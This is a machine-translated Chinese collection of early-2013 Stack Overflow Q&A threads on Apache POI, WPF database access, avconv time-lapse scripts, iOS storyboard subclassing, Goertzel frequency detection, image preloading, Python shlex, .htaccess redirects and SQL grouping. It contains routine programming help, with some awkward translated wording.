public boolean setCellData(String sheetName,String colName,int rowNum, String data){
    try{
    fis = new FileInputStream(path); 
    workbook = new XSSFWorkbook(path);

    if(rowNum<=0)
        return false;

    int index = workbook.getSheetIndex(sheetName);
    int colNum=-1;
    if(index==-1)
        return false;

    sheet = workbook.getSheetAt(index);

    row=sheet.getRow(0);
    for(int i=0;i<row.getLastCellNum();i++){
        //System.out.println(row.getCell(i).getStringCellValue().trim());
        if(row.getCell(i).getStringCellValue().trim().equals(colName))
            colNum=i;
    }
    if(colNum==-1)
        return false;

    sheet.autoSizeColumn(colNum); 
    row = sheet.getRow(rowNum-1);
    if (row == null)
        row = sheet.createRow(rowNum-1);

    cell = row.getCell(colNum); 
    if (cell == null)
        cell = row.createCell(colNum);

    // cell style
    //CellStyle cs = workbook.createCellStyle();
    //cs.setWrapText(true);
    //cell.setCellStyle(cs);

    cell.setCellValue(data);

    fileOut = new FileOutputStream(path);

    workbook.write(fileOut);
    fileOut.close();    

    }
    catch(Exception e){
        e.printStackTrace();
        return false;
    }
    return true;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:39:30.900

您已经初始化了 FileInputStream，但没有使用它。请更换

```
fis = new FileInputStream(path); 
workbook = new XSSFWorkbook(path); 
```

和

```
fis = new FileInputStream(path); 
workbook = new XSSFWorkbook(fis); 
```

这对我有用，并且没有显示任何错误。

# c# - 使用 WPF 应用程序连接到数据库

> ID：14111566
> 
> 赞同：2
> 
> 时间：2013-01-01T15:14:40.493
> 
> 标签：c#, wpf, database, mvvm

不久前我开始接触 WPF。
因为我正处于学习 MVVM 的阶段，所以我正在使用[这个](http://rachel53461.wordpress.com/2011/05/08/simplemvvmexample/)教程。

按照那个教程，我现在有一个涉及产品的基本项目。
我想做的下一件事是*学习如何连接到数据库并从中存储/检索信息。*

我的问题是，**连接到数据库的可用方法是什么？最好、最有效的方法是什么？**

此外，**WPF 应用程序可以连接到托管的 mysql 数据库（用于网站的数据库）吗？**

如果这有什么不同，我正在使用 VS2012。

原谅我的新手！我还是一个初学者！先感谢您！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-04-24T20:28:09.910

设置实体框架需要太长时间 + 兼容性问题，因此效率不高。用这个：

```
 SqlConnection connection = new SqlConnection
 {
      ConnectionString = ConfigurationManager.ConnectionStrings["Connection_String_Name"].ConnectionString
 };

 connection.Open();

 SqlCommand cmd = new SqlCommand("Query_For_What_You_Wanna_Do");
 cmd.ExecuteNonQuery();

 connection.Close(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T19:13:56.757

检查这一点：[EF 代码首先使用 oracle、mysql 等。](http://blogs.devart.com/dotconnect/entity-framework-code-first-support-for-oracle-mysql-postgresql-and-sqlite.html#codefirstsample)

最后，有一个示例的下载链接。

至于 WPF，如果您不熟悉它，我建议您阅读一些教程。一起搜索 WPF 和 EF 将导致很多或多或少有用的教程和博客等。但我建议首先使用 Entityframework 和代码优先方法。

# ubuntu - avconv - 传递图像路径列表

> ID：14111569
> 
> 赞同：4
> 
> 时间：2013-01-01T15:14:56.320
> 
> 标签：ubuntu, libavcodec

我想编写一个脚本，该脚本将根据一组图像文件路径的输入生成延时视频。我知道您可以执行以下操作：

```
avconv -r 15 -i %04d.JPG -s hd480 -vcodec libx264 time-lapse.mp4 
```

这将根据文件名模式 0000.JPG、0001.JPG 等在目录中查找文件。但是，我试图弄清楚是否有办法可以按顺序将其传递到文件名列表中我要处理？我的理想情况是我可以执行一些数据库查询以按时间顺序检索图像文件路径列表，然后将它们传递给 avconv 命令并让它即时生成视频。我的图像有一个特定的文件夹结构，所以理想情况下，我不想将必要的文件复制到临时目录中，以便能够正确命名它们然后处理它们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-10-23T08:26:09.973

这也是我让它工作的唯一方法（image2pipe 技巧对我不起作用）。

1.  制作一个文件夹，其中仅包含您想要在电影中使用的图像。

2.  重命名文件（确保在出现错误之前备份您的图像）

    ```
    aa=0;for i in `ls`; do mv $i `printf "%04d" $aa`.png; aa=$(($aa+1));done 
    ```

3.  运行 avconv

    ```
    avconv -f image2 -i %04d.png -b 2500k -codec mpeg4 Heligyro.avi 
    ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T20:34:10.067

我最终通过管道 ls 创建链接，然后渲染链接。

```
x=0; for i in $(ls -t *JPG); do counter=$(printf %05d $x); ln -s "$i" "$counter".jpg; x=$(($x+1)); done 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-06-02T22:54:56.433

我根据来自我的安全摄像头的图像制作延时视频。相机按日期将 JPG 分类到文件夹中，然后按小时分类到子文件夹中。

这会展平、重命名并将结果推送到 avconv。

```
#!/bin/bash

SOURCE_DIR="/home/ftp/camera/$1"
TIMELAPSE_DIR="/home/ftp/camera/timelapse-batch"
FRAME_DELAY=50

ls -1 $SOURCE_DIR |

        while read DAY;
        do
                echo "=================================================================";
                echo "| >>> Processing $SOURCE_DIR/$DAY";

                cd $SOURCE_DIR/$DAY;

                echo "| >>> Flattening...";

                find $SOURCE_DIR/$DAY -mindepth 2 -type f -exec mv -t $SOURCE_DIR/$DAY -i '{}' +

                echo "| >>> Frame Count: $(ls -1 | wc -l)";

                echo "| >>> Converting...";

                echo "-----------------------------------------------------------------";

                #gets list of images, renames them to a format that avconv expects, then runs avconv
                ls |
                        grep jpg |
                        awk -v name=$1 'BEGIN{a=0}{printf "mv %s " name "%04d.JPG\n" , $0, a++}' |
                        bash && avconv -y -r $FRAME_DELAY -i $1%4d.JPG -r $FRAME_DELAY -vcodec libx264 -q:v 4  -vf scale=iw:ih $TIMELAPSE_DIR/$DAY"_"$1.mp4;

                echo "-----------------------------------------------------------------";
                echo "| >>> Done!";
                echo "=================================================================";
                echo -e "\n\n\n\n";

        done 
```

# objective-c - 如何为多个子类使用单个故事板 uiviewcontroller

> ID：14111572
> 
> 赞同：126
> 
> 时间：2013-01-01T15:15:10.167
> 
> 标签：objective-c, cocoa-touch, ios5, uiviewcontroller, storyboard

假设我有一个包含`UINavigationController`作为初始视图控制器的故事板。它的根视图控制器是 的子类`UITableViewController`，即`BasicViewController`. 它`IBAction`连接到导航栏的右侧导航按钮

从那里我想将情节提要用作其他视图的模板，而无需创建其他情节提要。假设这些视图将具有完全相同的界面，但具有类的根视图控制器，`SpecificViewController1`并且`SpecificViewController2`它们是`BasicViewController`.
除了方法之外，这两个视图控制器将具有相同的功能和界面`IBAction`。
如下所示：

```
@interface BasicViewController : UITableViewController

@interface SpecificViewController1 : BasicViewController

@interface SpecificViewController2 : BasicViewController 
```

我可以做这样的事情吗？
我可以只实例化情节提要`BasicViewController`但有根视图控制器来子类`SpecificViewController1`化`SpecificViewController2`吗？

谢谢。

* * *

## 回答 #1

> 赞同：60
> 
> 时间：2013-01-01T17:51:21.120

很好的问题 - 但不幸的是只有一个蹩脚的答案。我不相信目前可以按照您的建议进行操作，因为 UIStoryboard 中没有初始化程序允许覆盖与情节提要相关联的视图控制器，如初始化情节提要中的对象详细信息中定义的那样。在初始化时，故事板中的所有 UI 元素都链接到它们在视图控制器中的属性。

默认情况下，它将使用情节提要定义中指定的视图控制器进行初始化。

如果您试图重用您在情节提要中创建的 UI 元素，它们仍然必须链接或关联到视图控制器使用它们的属性，以便它们能够“告诉”视图控制器有关事件。

复制故事板布局并不是什么大问题，特别是如果您只需要 3 个视图的类似设计，但是如果您这样做，您必须确保清除所有以前的关联，否则它会在尝试时崩溃与前一个视图控制器通信。您将能够在日志输出中将它们识别为 KVO 错误消息。

您可以采取以下几种方法：

*   将 UI 元素存储在 UIView 中 - 在 xib 文件中，并从您的基类中实例化它，并将其作为子视图添加到主视图中，通常是 self.view。然后，您只需使用情节提要布局，基本上空白的视图控制器在情节提要中保持其位置，但为其分配了正确的视图控制器子类。由于他们将从基地继承，他们将获得这种观点。

*   在代码中创建布局并从基本视图控制器安装它。显然，这种方法违背了使用情节提要的目的，但在您的情况下可能是要走的路。如果您的应用程序的其他部分可以从情节提要方法中受益，则可以在适当的情况下在这里和那里偏离。在这种情况下，就像上面一样，您只需使用分配了子类的银行视图控制器，然后让基本视图控制器安装 UI。

如果 Apple 想出一种方法来执行您的建议，那就太好了，但是将图形元素与控制器子类预先链接的问题仍然是一个问题。

有一个伟大的新年！好起来

* * *

## 回答 #2

> 赞同：44
> 
> 时间：2015-08-19T19:03:31.687

我们正在寻找的行代码是：

```
object_setClass(AnyObject!, AnyClass!) 
```

在 Storyboard -> 添加 UIViewController 给它一个 ParentVC 类名。

```
class ParentVC: UIViewController {

    var type: Int?

    override func awakeFromNib() {

        if type = 0 {

            object_setClass(self, ChildVC1.self)
        }
        if type = 1 {

            object_setClass(self, ChildVC2.self)
        }  
    }

    override func viewDidLoad() {   }
}

class ChildVC1: ParentVC {

    override func viewDidLoad() {
        super.viewDidLoad()

        println(type)
        // Console prints out 0
    }
}

class ChildVC2: ParentVC {

    override func viewDidLoad() {
        super.viewDidLoad()

        println(type)
        // Console prints out 1
    }
} 
```

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2015-03-19T14:18:29.513

正如公认的答案所述，看起来不可能与情节提要有关。

我的解决方案是使用 Nib——就像开发人员在故事板之前使用它们一样。**如果你想拥有一个可重用、可子类化的视图控制器（甚至是视图），我的建议是使用 Nibs。**

```
SubclassMyViewController *myViewController = [[SubclassMyViewController alloc] initWithNibName:@"MyViewController" bundle:nil]; 
```

当您将所有出口连接到“文件所有者”时，`MyViewController.xib`您没有指定 Nib 应该加载为哪个类，您只是指定键值对：“*这个视图应该连接到这个实例变量名称*。” 在调用`[SubclassMyViewController alloc] initWithNibName:`初始化过程时，指定将使用哪个视图控制器来“*控制*”您在 nib 中创建的视图。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2015-03-23T20:47:46.323

可以让故事板实例化自定义视图控制器的不同子类，尽管它涉及一种稍微不正统的技术：覆盖`alloc`视图控制器的方法。创建自定义视图控制器时，被覆盖的 alloc 方法实际上返回的是`alloc`在子类上运行的结果。

我应该以附带条件作为答案的开头，尽管我已经在各种场景中对其进行了测试并且没有收到任何错误，但我无法确保它能够应对更复杂的设置（但我认为它没有理由不工作） . 此外，我还没有使用这种方法提交任何应用程序，因此它可能会被 Apple 的审核流程拒绝（尽管我再次认为没有理由这样做）。

出于演示目的，我有一个`UIViewController`called的子类`TestViewController`，它有一个 UILabel IBOutlet 和一个 IBAction。在我的故事板中，我添加了一个视图控制器并将其类修改为`TestViewController`，并将 IBOutlet 连接到 UILabel 并将 IBAction 连接到 UIButton。我通过由前一个 viewController 上的 UIButton 触发的模态 segue 来呈现 TestViewController。

![故事板图像](../Images/306134b927d441b1240c133e519b67d9.png)

为了控制实例化哪个类，我添加了一个静态变量和关联的类方法，以便获取/设置要使用的子类（我想可以采用其他方法来确定要实例化哪个子类）：

测试视图控制器.m：

```
#import "TestViewController.h"

@interface TestViewController ()
@end

@implementation TestViewController

static NSString *_classForStoryboard;

+(NSString *)classForStoryboard {
    return [_classForStoryboard copy];
}

+(void)setClassForStoryBoard:(NSString *)classString {
    if ([NSClassFromString(classString) isSubclassOfClass:[self class]]) {
        _classForStoryboard = [classString copy];
    } else {
        NSLog(@"Warning: %@ is not a subclass of %@, reverting to base class", classString, NSStringFromClass([self class]));
        _classForStoryboard = nil;
    }
}

+(instancetype)alloc {
    if (_classForStoryboard == nil) {
        return [super alloc];
    } else {
        if (NSClassFromString(_classForStoryboard) != [self class]) {
            TestViewController *subclassedVC = [NSClassFromString(_classForStoryboard) alloc];
            return subclassedVC;
        } else {
            return [super alloc];
        }
    }
} 
```

对于我的测试，我有两个子类`TestViewController`:`RedTestViewController`和`GreenTestViewController`. 每个子类都有额外的属性，并且每个覆盖都`viewDidLoad`可以更改视图的背景颜色并更新 UILabel IBOutlet 的文本：

RedTestViewController.m：

```
- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.

    self.view.backgroundColor = [UIColor redColor];
    self.testLabel.text = @"Set by RedTestVC";
} 
```

GreenTestViewController.m：

```
- (void)viewDidLoad {
    [super viewDidLoad];

    self.view.backgroundColor = [UIColor greenColor];
    self.testLabel.text = @"Set by GreenTestVC";
} 
```

在某些情况下，我可能想实例化`TestViewController`自己，在其他情况下`RedTestViewController`或`GreenTestViewController`. 在前面的视图控制器中，我随机执行如下操作：

```
NSInteger vcIndex = arc4random_uniform(4);
if (vcIndex == 0) {
    NSLog(@"Chose TestVC");
    [TestViewController setClassForStoryBoard:@"TestViewController"];
} else if (vcIndex == 1) {
    NSLog(@"Chose RedVC");
    [TestViewController setClassForStoryBoard:@"RedTestViewController"];
} else if (vcIndex == 2) {
    NSLog(@"Chose BlueVC");
    [TestViewController setClassForStoryBoard:@"BlueTestViewController"];
} else {
    NSLog(@"Chose GreenVC");
    [TestViewController setClassForStoryBoard:@"GreenTestViewController"];
} 
```

请注意，该`setClassForStoryBoard`方法检查以确保所请求的类名确实是 TestViewController 的子类，以避免任何混淆。上面的参考`BlueTestViewController`是为了测试这个功能。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2017-02-04T01:56:35.213

试试这个，在instanceViewControllerWithIdentifier 之后。

```
- (void)setClass:(Class)c {
    object_setClass(self, c);
} 
```

像 ：

```
SubViewController *vc = [sb instantiateViewControllerWithIdentifier:@"MainViewController"];
[vc setClass:[SubViewController class]]; 
```

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2019-08-23T08:53:55.180

特别基于[nickgzzjr](https://stackoverflow.com/a/55640515/7183675)和[Jiří Zahálka](https://stackoverflow.com/a/32103618/7183675)的答案以及来自 CocoaBob 的第二个答案下的评论，我准备了简短的通用方法来完全满足 OP 的需求。您只需要检查故事板名称和视图控制器故事板 ID

```
class func instantiate<T: BasicViewController>(as _: T.Type) -> T? {
        let storyboard = UIStoryboard(name: "StoryboardName", bundle: nil)
        guard let instance = storyboard.instantiateViewController(withIdentifier: "Identifier") as? BasicViewController else {
            return nil
        }
        object_setClass(instance, T.self)
        return instance as? T
    } 
```

添加了可选项以避免强制展开（swiftlint 警告），但方法返回正确的对象。

另外：您需要初始化仅存在于子类中的属性，然后再从转换对象中读取它们（如果子类具有这些属性而`BasicViewController`没有）。这些属性不会自动初始化，并且在初始化之前尝试读取它们会导致崩溃。因为它们在那里有强制转换的效果，所以即使是弱变量也很可能不会被设置为 nil（将包含垃圾）。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2015-03-22T03:25:46.183

虽然它不是严格的子类，但您可以：

1.  `option`- 拖动文档大纲中的基类视图控制器进行复制
2.  将新的视图控制器副本移动到情节提要上的单独位置
3.  在 Identity Inspector 中将*Class*更改为子类视图控制器

这是我编写的[Bloc](http://www.bloc.io/ios)教程中的一个示例，子`ViewController`类化为`WhiskeyViewController`：

![以上三个步骤的动画](../Images/8d14cd647cab9d18755b6d67ae8e746f.png)

这允许您在情节提要中创建视图控制器子类的子类。然后您可以使用它`instantiateViewControllerWithIdentifier:`来创建特定的子类。

这种方法有点不灵活：情节提要中对基类控制器的后期修改不会传播到子类。如果您有*很多*子类，则使用其他解决方案可能会更好，但这将在紧要关头。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2017-05-21T18:14:22.487

Objc_setclass 方法不会创建 childvc 的实例。但是在弹出 childvc 时，正在调用 childvc 的 deinit。由于没有为 childvc 单独分配内存，因此应用程序崩溃。Basecontroller 有一个 instance ，而 child vc 没有。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2017-07-28T13:05:11.910

如果您不太依赖故事板，您可以为控制器创建一个单独的 .xib 文件。

将适当的 File's Owner 和 outlets 设置为 Main VC 中的`MainViewController`和覆盖`init(nibName:bundle:)`，以便其子级可以访问相同的 Nib 及其出口。

您的代码应如下所示：

```
class MainViewController: UIViewController {
    @IBOutlet weak var button: UIButton!

    override init(nibName nibNameOrNil: String?, bundle nibBundleOrNil: Bundle?) {
        super.init(nibName: "MainViewController", bundle: nil)
    }

    required init?(coder aDecoder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }

    override func viewDidLoad() {
        super.viewDidLoad()
        button.tintColor = .red
    }
} 
```

您的子 VC 将能够重用其父级的 nib：

```
class ChildViewController: MainViewController {
    override func viewDidLoad() {
        super.viewDidLoad()
        button.tintColor = .blue
    }
} 
```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2019-10-07T16:27:37.873

# 有一个简单、明显的日常解决方案。

只需将现有的故事板/控制器放在新的故事板/控制器中。IE 作为容器视图。

这与视图控制器的“子类化”完全相同。

一切都像在子类中一样工作。

就像您通常**将视图子视图放在另一个视图**中一样，您通常会将**视图控制器放在另一个视图控制器**中。

你还能怎么做？

它是 iOS 的一个基本部分，就像“子视图”的概念一样简单。

就这么容易...

```
/*

Search screen is just a modification of our List screen.

*/

import UIKit

class Search: UIViewController {

    var list: List!

    override func viewDidLoad() {
        super.viewDidLoad()

        list = (_sb("List") as! List
        addChild(list)
        view.addSubview(list.view)
        list.view.bindEdgesToSuperview()
        list.didMove(toParent: self)
    }
} 
```

你现在显然必须`list`做任何你想做的事

```
list.mode = .blah
list.tableview.reloadData()
list.heading = 'Search!'
list.searchBar.isHidden = false 
```

等等等等

容器视图“就像”子类化，就像“子视图”“就像”子类化一样。

当然很明显，你不能“子类化布局”——这意味着什么？

（“子类化”与 OO 软件有关，与“布局”无关。）

显然，当你想重用一个视图时，你只需在另一个视图中子视图它。

当您想重用控制器布局时，您只需在另一个控制器中容器查看它。

这就像iOS最基本的机制！！

* * *

注意 - 多年来，动态加载另一个视图控制器作为容器视图已经很简单了。上一节解释：[https ://stackoverflow.com/a/23403979/294884](https://stackoverflow.com/a/23403979/294884)

注意 - “_sb” 只是我们用来节省打字的一个明显的宏，

```
func _sb(_ s: String)->UIViewController {
    // by convention, for a screen "SomeScreen.storyboard" the
    // storyboardID must be SomeScreenID
    return UIStoryboard(name: s, bundle: nil)
       .instantiateViewController(withIdentifier: s + "ID")
} 
```

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2020-06-11T03:59:59.433

感谢@Jiří Zahálka 鼓舞人心的回答，我 4 年前[在这里](https://stackoverflow.com/questions/14111572/how-to-use-single-storyboard-uiviewcontroller-for-multiple-subclass/32103618?noredirect=1#comment61819607_32103618)回答了我的解决方案，但@Sayka 建议我将其发布为答案，所以就在这里。

在我的项目中，通常，如果我将 Storyboard 用于 UIViewController 子类，我总是准备一个`instantiate()`在该子类中调用的静态方法，以便轻松地从 Storyboard 创建一个实例。因此，为了解决 OP 的问题，如果我们想为不同的子类共享相同的 Storyboard，我们可以`setClass()`在返回之前简单地访问该实例。

```
class func instantiate() -> SubClass {
    let instance = (UIStoryboard(name: "Main", bundle: nil).instantiateViewControllerWithIdentifier("SuperClass") as? SuperClass)!
    object_setClass(instance, SubClass.self)
    return (instance as? SubClass)!
} 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2016-04-28T09:39:08.953

可能最灵活的方法是使用可重用视图。

（在单独的 XIB 文件中创建一个视图，或者`Container view`将其添加到情节提要中的每个子类视图控制器场景中）

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2019-04-11T20:19:20.930

从各处获取答案，我想出了这个巧妙的解决方案。

用这个函数创建一个父视图控制器。

```
class ParentViewController: UIViewController {

    func convert<T: ParentViewController>(to _: T.Type) {

        object_setClass(self, T.self)

    }

} 
```

这允许编译器确保子视图控制器继承自父视图控制器。

然后，每当您想使用子类连接到此控制器时，您可以执行以下操作：

```
override func prepare(for segue: UIStoryboardSegue, sender: Any?) {
    super.prepare(for: segue, sender: sender)

    if let parentViewController = segue.destination as? ParentViewController {
        ParentViewController.convert(to: ChildViewController.self)
    }

} 
```

很酷的部分是你可以添加一个故事板引用到它自己，然后继续调用“下一个”子视图控制器。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2020-06-09T20:28:58.330

Cocoabob 来自 Jiří Zahálka 的评论帮助我获得了这个解决方案，并且效果很好。

```
func openChildA() {
    let storyboard = UIStoryboard(name: "Main", bundle: nil);
    let parentController = storyboard
        .instantiateViewController(withIdentifier: "ParentStoryboardID") 
        as! ParentClass;
    object_setClass(parentController, ChildA.self)
    self.present(parentController, animated: true, completion: nil);
} 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2021-06-23T07:19:18.620

这很简单。只需在 xib 中定义 BaseViewController，然后像这样使用它：

```
let baseVC: BaseViewController = BaseViewController(nibName: "BaseViewController", bundle: nil)
let subclassVC: ChildViewController = ChildViewController(nibName: "BaseViewController", bundle: nil) 
```

制作很简单，您可以将标识符提取到字段并加载到如下方法：

```
public static var baseNibIdentifier: String {
    return "BaseViewController"
}

public static func loadFromBaseNib<T>() -> T where T : UIViewController {
    return T(nibName: self.baseNibIdentifier, bundle: nil)
} 
```

然后你可以像这样使用它：

```
let baseVC: BaseViewController = BaseViewController.loadFromBaseNib()
let subclassVC: ChildViewController = ChildViewController.loadFromBaseNib() 
```

# objective-c - 检测特定频率的算法？

> ID：14111573
> 
> 赞同：0
> 
> 时间：2013-01-01T15:15:27.523
> 
> 标签：objective-c, c, audio, frequency-analysis

使用 Goertzel 算法，我正在检测进入 iphone 麦克风的某个频率（我使用缓冲样本）。

它可以工作，但是在更改值时会出现许多奇怪的稳定性问题。（它们在同一设备上的频谱应用程序中是恒定的，但不是使用 Goertzel 算法）

我想用另一种方式`C`来检测某个频率，或者某个频率范围内的能量，（我不知道**FFT**是否良好和准确，如果是我需要一个好的算法）。如果你有一个函数只能获取样本和长度，并在某个频谱或某个已知频率返回能量，那会有所帮助。我需要一个严肃的，也许是二阶过滤器。

这是我的 Goertzel：

```
float goertzel_mag(int16_t* data ,int SAMPLING_RATE ,double TARGET_FREQUENCY,int numSamples )
{
    int     k,i;
    float   floatnumSamples;
    float   omega,sine,cosine,coeff,q0,q1,q2,magnitude,real,imag;

    float   scalingFactor = numSamples / 2.0; // -2

    floatnumSamples = (float) numSamples;
    k = (int) (0.5 + ((floatnumSamples * TARGET_FREQUENCY) / SAMPLING_RATE));
    omega = (2.0 * M_PI * k) / floatnumSamples;
    sine = sin(omega);
    cosine = cos(omega);
    coeff = 2.0 * cosine;
    q0=0;
    q1=0;
    q2=0;

    for(i=0; i<numSamples; i++)
    {
        q0 = coeff * q1 - q2 + data[i];
        q2 = q1;
        q1 = q0;
    }

    real = (q1 - q2 * cosine) / scalingFactor;
    imag = (q2 * sine) / scalingFactor;

    //double theta = atan2 ( imag, real); //PHASE
    magnitude = sqrtf(real*real + imag*imag);
    return magnitude;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T16:29:51.910

[这是对频率检测的各种方法的一个很好的描述](http://www.cs.uregina.ca/Research/Techreports/2003-06.pdf)。

当您在 MacOSX 或 iOS 上进行开发时，请查看[Accelerate Framework](https://developer.apple.com/performance/accelerateframework.html)，它提供了可移植的 [在 iOS 和 MacOSX 内] 并优化了 DFT 的实现。

如果您打算在 AppStore 中以应用程序的形式发布您的作品，则应特别注意许可。FFTW 许可证是否与您的使用兼容？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T16:46:13.880

Apple 提供 Accelerate 框架。
[在此处加速框架](https://developer.apple.com/library/mac/#documentation/Accelerate/Reference/AccelerateFWRef/_index.html)
[FFT 在此处](https://developer.apple.com/library/mac/#documentation/Accelerate/Reference/vDSPRef/Reference/reference.html#//apple_ref/doc/uid/TP40009464)

它包括 vDSP 和几个 FFT 例程，包括以下类别：
1D 快速傅里叶变换（固定长度）
1D 快速傅里叶变换（就地复数）
1D 快速傅里叶变换（就地实数）
1D 快速傅里叶变换（异地复数） )
1D 快速傅里叶变换 (Out-of-Place Real)
1D 快速傅里叶变换 (支持函数)
2D 快速傅里叶变换 (In-Place Complex)
2D 快速傅里叶变换 (In-Place Real)
2D 快速傅里叶变换 (Out-of- Place Complex)
2D Fast Fourier Transforms (Out-of-Place Real)
Discrete Fourier Transforms

Accelerate 框架经常被忽视。

# android - 自动启动和广播（删除警报）

> ID：14111575
> 
> 赞同：1
> 
> 时间：2013-01-01T15:15:34.747
> 
> 标签：android

我有一个自动启动课程。一切运行完美，但是当我禁用通知并重新启动时，我从主应用程序再次收到通知。alarm.CancelAlarm 不应该删除所有挂起的警报吗？

```
public class AutoStartNuova extends BroadcastReceiver
public void onReceive(Context context, Intent intent)
    {   
        if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED"))
        {

Allarme alarm = new Allarme();
            alarm.CancelAlarm(context); 
```

警报管理器：

现在日历 = Calendar.getInstance(); 如果（现在。之后（cal1））

# slider - 带有垂直轮播的全屏幻灯片。全屏图像问题淡入

> ID：14111576
> 
> 赞同：0
> 
> 时间：2013-01-01T15:15:37.920
> 
> 标签：slider, slideshow, fullscreen, carousel, transition

我制作了一个垂直轮播，其中包含单击时应该全屏可见的图像。但问题是我无法弄清楚如何确保全屏图像被预加载或像缩略图图像一样工作（预加载）。

我不确定使用css背景预加载全屏图像要遵循什么方法，以及当我单击轮播中的缩略图时如何确保图像淡入或只是一些过渡。

请查看上传我的代码的以下链接。 [http://www.lluvia.me/slideshow/carousel.html](http://www.lluvia.me/slideshow/carousel.html)

如果方便，请随时通过检查源来检查脚本。帮助将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:27:03.857

找到这篇文章并认为它可能会对您有所帮助，[使用 jQuery 预加载图像](https://stackoverflow.com/questions/476679/preloading-images-with-jquery)

尝试在您的正文中发布一些代码以供将来参考。:)

快捷方便：

```
function preload(arrayOfImages) {
    $(arrayOfImages).each(function(){
        $('<img/>')[0].src = this;
        // Alternatively you could use:
        // (new Image()).src = this;
    });
}

// Usage:

preload([
    'img/imageName.jpg',
    'img/anotherOne.jpg',
    'img/blahblahblah.jpg'
]); 
```

或者，如果你想要一个 jQuery 插件：

```
$.fn.preload = function() {
this.each(function(){
    $('<img/>')[0].src = this;
});
}

// Usage:

$(['img1.jpg','img2.jpg','img3.jpg']).preload(); 
```

或者，如果您想完全使用 CSS，请查看此页面： http: [//perishablepress.com/3-ways-preload-images-css-javascript-ajax/](http://perishablepress.com/3-ways-preload-images-css-javascript-ajax/)您可以将背景图像放置在屏幕外然后来需要时出现在屏幕上。

```
#preload-01 { background: url(http://domain.tld/image-01.png) no-repeat -9999px -9999px; }
#preload-02 { background: url(http://domain.tld/image-02.png) no-repeat -9999px -9999px; }
#preload-03 { background: url(http://domain.tld/image-03.png) no-repeat -9999px -9999px; } 
```

# python - 将字符串转换为带有引号的元素的空格分隔列表

> ID：14111580
> 
> 赞同：3
> 
> 时间：2013-01-01T15:16:17.167
> 
> 标签：python

Python中是否有一种简单的方法可以使用空格作为分隔符将字符串转换为列表，但忽略引用文本中的空格？IE：每个单词都被视为一个单独的搜索词，但任何引用的文本都被视为一个词。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-01T15:17:26.330

是的，通过使用以下[`shlex.split()`功能](http://docs.python.org/2/library/shlex.html#shlex.split)：

```
>>> import shlex
>>> shlex.split('Some whitespace "separated string"')
['Some', 'whitespace', 'separated string'] 
```

# android - Android操作栏标签图标png尺寸

> ID：14111585
> 
> 赞同：5
> 
> 时间：2013-01-01T15:16:40.070
> 
> 标签：android, tabs, android-actionbar, android-icons

**操作栏选项卡**图标的尺寸应该是多少？（主要是指像素大小和填充）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:20:32.197

这取决于正在运行活动的设备屏幕密度。通常的图标大小为~~36x36 像素、48x48 像素、72x72 像素、96x96 像素。~~ ~~18x18 像素, 24x24 像素, 36x36 像素, 48x48 像素~~ 48x48 像素, 32x32 像素, 24x24 像素

试试这个： http: ~~[//developer.android.com/guide/practices/ui_guidelines/icon_design_launcher.html#size](http://developer.android.com/guide/practices/ui_guidelines/icon_design_launcher.html#size)~~ ~~[http://developer.android.com/guide/practices/ui_guidelines/icon_design_action_bar.html#icon11](http://developer.android.com/guide/practices/ui_guidelines/icon_design_action_bar.html#icon11)~~ [http://developer .android.com/guide/practices/ui_guidelines/icon_design_tab.html#icon5](http://developer.android.com/guide/practices/ui_guidelines/icon_design_tab.html#icon5)

# apache - .htaccess 重定向文件夹，除了一个文件夹

> ID：14111586
> 
> 赞同：0
> 
> 时间：2013-01-01T15:16:42.097
> 
> 标签：apache, mod-rewrite, redirect

我想将以下类型的文件夹重定向`example.com/stores/something/title/`到 `example.com/stores/title/`. 我做了以下重定向：

```
RedirectMatch 301 /stores/(.*)/(.*)/(.*) http://www.example.com/stores/$2/$3 
```

它可以工作，但是我有一个问题：我不想重定向这些链接：

```
example.com/stores/title/page/2/ 
```

我的重定向将上述链接重定向到`example.com/stores/2/`. 所以我想重定向除了“页面”子文件夹之外的所有内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T18:26:34.830

您可以使用负前瞻来确保第三个参数不是“页面”

```
RedirectMatch 301 /stores/(.*)/(?!page)(.*)/(.*) http://www.example.com/stores/$2/$3 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:22:24.097

```
RewriteRule .*/page/.* - [L] 
```

应该这样做。它应该出现在其他规则之上。

# sql - 带计数的 SQL 查询

> ID：14111587
> 
> 赞同：1
> 
> 时间：2013-01-01T15:16:43.203
> 
> 标签：sql, sql-server, group-by

我正在使用 MS-SQL，并且我有一个包含以下列的表：

会话 ID | 日期 | 名字 | 姓氏我想按 sessionId 分组，然后获取最大日期的行。除此之外，我想计算sessionId。

例如：

```
xxx | 21/12/2012 | f1 | l1
xxx | 20/12/2012 | f2 | l2
yyy | 21/12/2012 | f3 | l3
yyy | 20/12/2012 | f4 | l4 
```

我想得到以下行：

```
xxx | 21/12/2012 | f1 | l1 | 2
